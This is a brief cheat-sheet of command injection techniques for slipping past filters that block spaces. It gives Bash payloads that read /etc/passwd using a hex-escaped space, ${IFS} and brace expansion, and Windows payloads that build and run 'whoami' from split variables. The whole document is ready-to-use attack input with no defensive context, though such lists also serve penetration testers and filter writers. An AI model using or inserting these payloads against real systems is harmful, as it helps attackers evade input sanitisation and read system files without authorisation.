# Command Injection tricks

## Command injection without certain characters.

### Command injection without spaces.
#### Bash
1. `CMD=$'\x20/etc/passwd'&&cat$CMD`
2. `cat${IFS}/etc/passwd`
3. `{cat,/etc/passwd}`

#### Windows
1. 
```
set w=who
set i=ami
call %w%%i%
```
2. `call,%w%%i%`
